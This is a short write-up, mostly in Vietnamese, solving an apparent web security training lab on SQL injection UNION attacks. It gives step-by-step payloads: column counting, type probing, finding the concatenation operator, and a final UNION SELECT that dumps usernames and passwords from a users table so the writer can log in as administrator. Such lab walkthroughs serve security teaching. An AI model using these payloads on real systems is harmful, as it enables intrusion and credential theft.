# **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.  
 The database contains a different table called `users`, with columns called `username` and `password`.  
  To solve the lab, perform a SQL injection UNION attack that retrieves all `usernames` and `passwords`, and use the information to log in as the `administrator` user.

  # **Solution**
  Nhìn qua trang mục tiêu ta thấy nội dung chính có tên sản phẩm và button `View details`  

  Bước đầu vẫn là xác định số cột và kiểu dữ liệu của mỗi cột đó.

  ```
  https://0aea00e3039510e381b9df4e003100ee.web-security-academy.net/
  ```
  Chèn thêm vào tham số bộ lọc qua URL:
  
  ```
  ' UNION SELECT NULL, NULL -- 
  ```

  Thành công xác định số cột là 2. Tiếp theo là kiểu dữ liệu:

```
# 1
' UNION SELECT NULL, 'a' -- 
```

```
# 2
' UNION SELECT 'a', 'a' --
```

```
# 3
' UNION SELECT 1, 'a' --
```

Thử cả 3 case trên thì ta thấy 1 và 3 Pass, 2 Error. Từ đó ta suy ra được cột đầu kiểu dữ liệu số, cột 2 kiểu dữ liệu kí tự và chỉ có thể thấy cột 2 hiển thị rõ trên trang mục tiêu.

Cần thực hiện toán tử nối chuỗi trong câu select của union để khai thác dữ liệu.

Do có sự khác biệt trong toán tử nối chuỗi của các kiểu cơ sở dữ liệu khác nhau nên ta cần thêm một bước xác định loại cơ sở dữ liệu mục tiêu dùng. Hoặc cũng có thể thử lần lượt các kiểu toán tử nối chuỗi khác nhau cho tới khi thành công=)))

```
' UNION SELECT NULL, 'a' || ' done' --
```

Well. Cách này thành công nên || sẽ là toán tử nối chuỗi mà chúng ta dùng lần này.

Như nhiệm vụ được giao thì ta biết có một bảng `users` gồm 2 cột `username` và `password`. Sửa đoạn mã như sau:

```
' UNION SELECT NULL, username || '~~' || password FROM users --
```

Done~~. Tiếp theo đó chỉ cần dùng thông tin đăng nhập `administrator` để dăng nhập là xong goyyy~~~~

![image](https://i.pinimg.com/236x/ca/82/52/ca825243bc9c405a9cac886925a3d12f.jpg)